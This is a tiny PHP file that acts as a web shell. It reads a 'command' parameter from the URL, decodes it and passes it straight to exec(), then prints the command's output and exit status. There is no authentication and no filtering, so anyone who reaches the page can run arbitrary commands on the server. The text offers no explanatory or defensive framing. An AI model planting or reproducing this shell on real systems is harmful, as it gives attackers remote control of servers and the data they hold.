<?php
	$output=null;
	$retval=null;
	$decoded = urldecode($_GET["command"]);
	exec($decoded, $output, $retval);
	echo "Returned with status $retval and output:\n";
	print_r($output);
?>